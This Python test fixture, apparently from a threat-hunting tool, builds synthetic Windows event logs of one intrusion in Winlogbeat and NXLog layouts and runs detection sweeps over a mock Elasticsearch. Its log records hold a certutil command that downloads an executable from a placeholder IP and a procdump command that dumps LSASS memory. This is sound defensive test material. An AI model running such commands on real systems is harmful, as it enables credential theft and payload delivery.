"""One Windows intrusion in two shipper layouts, swept and expanded over the in-memory Elasticsearch.

The activity is synthetic: a network logon, then a shell whose children are a credential dumper aimed at LSASS (the
high anchor) and a downloader (with its outbound connection and its process creation in the Security log). It is
written once as Winlogbeat records and once as NXLog's flat im_msvistalog JSON (built from the Winlogbeat records by
`nxlog_hit`), so a sweep and expansion over either layout can be compared link for link.
"""
from __future__ import annotations

import tempfile
from collections import Counter
from datetime import UTC, datetime, timedelta
from pathlib import Path

from romulus.evidence.windows_catalog import SECURITY, SYSMON
from tests.test_nxlog_windows import FLAT_TYPES, nxlog_hit
from tests.throughput_fixture import MiniES
from tests.windows_fixtures import LogicalWindowsEvent, windows_hit

HOST = "ws01.example.test"
T0 = datetime(2026, 1, 2, 3, 0, tzinfo=UTC)
WINDOW_START, WINDOW_END = T0 - timedelta(hours=1), T0 + timedelta(hours=1)
SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"
WINLOGBEAT_TARGET, NXLOG_TARGET = "winlogbeat-ws", "nxlog-ws"


def _ts(seconds: int) -> str:
    return (T0 + timedelta(seconds=seconds)).isoformat().replace("+00:00", "Z")


def _guid(number: int) -> str:
    return f"{{00000000-0000-0000-0000-{number:012x}}}"


def _subject() -> dict:
    return {"SubjectUserSid": "S-1-5-21-111-222-333-1100", "SubjectDomainName": "EXAMPLE",
            "SubjectUserName": "analyst", "SubjectLogonId": "0x3e7a5"}


def logical_events() -> list[LogicalWindowsEvent]:
    """The intrusion's records, in time order."""
    cmd, certutil = _guid(0xA1), _guid(0xA2)
    logon = LogicalWindowsEvent("Security", SECURITY, 4624, HOST, 5001, _ts(-60), {
        "SubjectUserSid": "S-1-5-18", "SubjectDomainName": "EXAMPLE", "SubjectUserName": "WS01$",
        "SubjectLogonId": "0x3e7", "TargetUserSid": "S-1-5-21-111-222-333-1100", "TargetDomainName": "EXAMPLE",
        "TargetUserName": "analyst", "TargetLogonId": "0x3e7a5", "LogonType": "3", "LogonProcessName": "NtLmSsp",
        "AuthenticationPackageName": "NTLM", "WorkstationName": "WS02", "LogonGuid": _guid(0),
        "IpAddress": "10.20.0.7", "IpPort": "50200", "ProcessId": "0x0", "ProcessName": "-"})
    shell = LogicalWindowsEvent(SYSMON_CHANNEL, SYSMON, 1, HOST, 6001, _ts(0), {
        "UtcTime": "2026-01-02 03:00:00.000", "ProcessGuid": cmd, "ProcessId": "4100",
        "Image": r"C:\Windows\System32\cmd.exe", "CommandLine": "cmd.exe", "User": r"EXAMPLE\analyst",
        "LogonId": "0x3e7a5", "ParentProcessGuid": _guid(0xA0), "ParentProcessId": "700",
        "ParentImage": r"C:\Windows\explorer.exe", "ParentCommandLine": r"C:\Windows\explorer.exe",
        "Hashes": "SHA256=AAAA0123456789,MD5=0123456789AAAA"})
    download = LogicalWindowsEvent(SYSMON_CHANNEL, SYSMON, 1, HOST, 6002, _ts(60), {
        "UtcTime": "2026-01-02 03:01:00.000", "ProcessGuid": certutil, "ProcessId": "4200",
        "Image": r"C:\Windows\System32\certutil.exe", "OriginalFileName": "CertUtil.exe",
        "CommandLine": r"certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\Users\Public\a.exe",
        "User": r"EXAMPLE\analyst", "LogonId": "0x3e7a5", "ParentProcessGuid": cmd, "ParentProcessId": "4100",
        "ParentImage": r"C:\Windows\System32\cmd.exe", "ParentCommandLine": "cmd.exe",
        "Hashes": "SHA256=BBBB0123456789,MD5=0123456789BBBB"})
    created = LogicalWindowsEvent("Security", SECURITY, 4688, HOST, 5002, _ts(60), {
        **_subject(), "NewProcessId": hex(4200), "ProcessId": hex(4100),
        "NewProcessName": r"C:\Windows\System32\certutil.exe", "ParentProcessName": r"C:\Windows\System32\cmd.exe",
        "CommandLine": r"certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\Users\Public\a.exe",
        "TargetUserSid": "S-1-0-0", "TargetDomainName": "-", "TargetUserName": "-", "TargetLogonId": "0x0",
        "TokenElevationType": "%%1936", "MandatoryLabel": "S-1-16-12288"})
    connect = LogicalWindowsEvent(SYSMON_CHANNEL, SYSMON, 3, HOST, 6003, _ts(70), {
        "UtcTime": "2026-01-02 03:01:10.000", "ProcessGuid": certutil, "ProcessId": "4200",
        "Image": r"C:\Windows\System32\certutil.exe", "User": r"EXAMPLE\analyst", "Protocol": "tcp",
        "Initiated": "true", "SourceIp": "10.20.0.5", "SourceHostname": HOST, "SourcePort": "50555",
        "DestinationIp": "198.51.100.9", "DestinationPort": "80"})
    dump = LogicalWindowsEvent(SYSMON_CHANNEL, SYSMON, 1, HOST, 6004, _ts(30), {
        "UtcTime": "2026-01-02 03:00:30.000", "ProcessGuid": _guid(0xA3), "ProcessId": "4300",
        "Image": r"C:\Users\Public\procdump64.exe", "OriginalFileName": "procdump",
        "CommandLine": r"procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\l.dmp",
        "User": r"EXAMPLE\analyst", "LogonId": "0x3e7a5", "ParentProcessGuid": cmd, "ParentProcessId": "4100",
        "ParentImage": r"C:\Windows\System32\cmd.exe", "ParentCommandLine": "cmd.exe",
        "Hashes": "SHA256=CCCC0123456789,MD5=0123456789CCCC"})
    return [logon, shell, dump, download, created, connect]


def winlogbeat_docs() -> list[dict]:
    docs = [windows_hit(event, "winlogbeat_8") for event in logical_events()]
    for doc in docs:
        doc["_index"] = WINLOGBEAT_TARGET
    return docs


def nxlog_docs() -> list[dict]:
    docs = [nxlog_hit(doc) for doc in [windows_hit(event, "winlogbeat_8") for event in logical_events()]]
    for doc in docs:
        doc["_index"] = NXLOG_TARGET
    return docs


WINLOGBEAT_TYPES = {"@timestamp": "date", "agent.type": "keyword", "winlog.channel": "keyword",
                    "winlog.provider_name": "keyword", "winlog.event_id": "keyword",
                    "winlog.computer_name": "keyword", "winlog.record_id": "long",
                    "winlog.event_data": "flattened", "winlog.user_data": "flattened"}


def nxlog_types(docs: list[dict], *, mapping: str = "keyword") -> dict[str, str]:
    """The mapping of every top-level name the flat records carry: keyword fields, as an index template gives
    ("keyword"); what Elasticsearch's dynamic mapping gives JSON without a template, a text field with a keyword
    subfield for each string and a long for each integer ("dynamic"); or text fields alone ("text")."""
    names = {name: value for doc in docs for name, value in doc["_source"].items()
             if not name.startswith("@") and name != "tags"}
    if mapping == "keyword":
        return {**FLAT_TYPES, **{name: "keyword" for name in names if name not in FLAT_TYPES},
                "EventID": "long", "RecordNumber": "long"}
    out = {"@timestamp": "date"}
    for name, value in names.items():
        if isinstance(value, bool):
            out[name] = "boolean"
        elif isinstance(value, int):
            out[name] = "long"
        else:
            out[name] = "text"
            if mapping == "dynamic":
                out[f"{name}.keyword"] = "keyword"
    return out


def split_docs() -> dict[str, list[dict]]:
    """The same records across two targets: Sysmon's through Winlogbeat, the Security log's through NXLog."""
    winlogbeat = [doc for doc in winlogbeat_docs() if doc["_source"]["winlog"]["channel"] != "Security"]
    nxlog = [doc for doc in nxlog_docs() if str(doc["_source"]["Channel"]).casefold() == "security"]
    return {WINLOGBEAT_TARGET: winlogbeat, NXLOG_TARGET: nxlog}


def contracts_for(docs: dict[str, list[dict]], *, mapping: str = "keyword"):
    """Each target's contract as a source profile builds it: role and OS read from the mapping alone."""
    from romulus.sources.profile import contract_from_types
    out = {}
    if WINLOGBEAT_TARGET in docs:
        out[WINLOGBEAT_TARGET] = contract_from_types(WINLOGBEAT_TARGET, WINLOGBEAT_TYPES, hosts=(HOST,))
    if NXLOG_TARGET in docs:
        out[NXLOG_TARGET] = contract_from_types(NXLOG_TARGET, nxlog_types(docs[NXLOG_TARGET], mapping=mapping),
                                                hosts=(HOST,))
    return out


def run(layout: str, *, docs: dict[str, list[dict]] | None = None, contracts=None, mapping: str = "keyword",
        max_source_queries: int = 400):
    """Sweep and expand the intrusion in one layout: "winlogbeat", "nxlog", or "split" (Sysmon through Winlogbeat and
    the Security log through NXLog, two targets), with NXLog's records under `mapping` (see nxlog_types). Returns
    (repo, expansion summary, physical searches per target for the sweep and for expansion)."""
    from romulus.config import Settings
    from romulus.hunt.expansion import ExpansionEngine
    from romulus.hunt.links import LinkFetcher
    from romulus.hunt.pivot import PivotExecutor
    from romulus.hunt.sweep import Sweep
    from romulus.sources.es import ElasticClient
    from romulus.sources.models import Window
    from romulus.store.db import make_engine, migrate
    from romulus.store.repo import Repo

    if docs is None:
        docs = {"winlogbeat": lambda: {WINLOGBEAT_TARGET: winlogbeat_docs()},
                "nxlog": lambda: {NXLOG_TARGET: nxlog_docs()}, "split": split_docs}[layout]()
    contracts = contracts or contracts_for(docs, mapping=mapping)
    es = MiniES(docs, {target: contract.time_field for target, contract in contracts.items()})
    searches: Counter = Counter()
    serve = es.__call__

    def counting(request):
        path = request.url.path
        if request.method == "POST" and path.endswith("/_search"):
            body = json.loads(request.content) if request.content else {}
            searches[es.pits[body["pit"]["id"]] if path == "/_search" else path.split("/")[1]] += 1
        return serve(request)

    import json

    import httpx
    client = ElasticClient(Settings(es_url="http://es.invalid"), transport=httpx.MockTransport(counting))
    window = Window(start=WINDOW_START, end=WINDOW_END)
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    targets = list(contracts)
    repo.create_hunt("h1", {
        "window": {"start": window.start.isoformat(), "end": window.end.isoformat()},
        "style": "broad", "hypothesis": "", "original_input": {}, "targets": targets,
        "pack": {"version": "test", "playbooks": []}, "normalizer": "test", "policy": "test",
        "model": {}, "romulus_version": "test", "ai_agent": {"requested": False}, "source_profiles": {},
        "budgets": {"wall_clock_minutes": 120}}, "digest", "test")
    repo.set_hunt_state("h1", "running")
    with tempfile.TemporaryDirectory() as tmp:
        sweep = Sweep(repo, client, "h1", window, contracts, stage_dir=Path(tmp))
        for target in targets:
            sweep.run_target(target)
        sweep.finalize()
        sweep.close_stage()
    swept = Counter(searches)
    searches.clear()
    executor = PivotExecutor(repo, client, "h1", contracts, source_query_budget=max_source_queries,
                             dataset_inventory={})
    summary = ExpansionEngine(repo, "h1", window, LinkFetcher(executor, window.start, window.end),
                              max_depth=3, max_source_queries=max_source_queries,
                              wall_clock_seconds=10**9).run()
    return repo, summary, {"sweep": dict(swept), "expansion": dict(searches)}
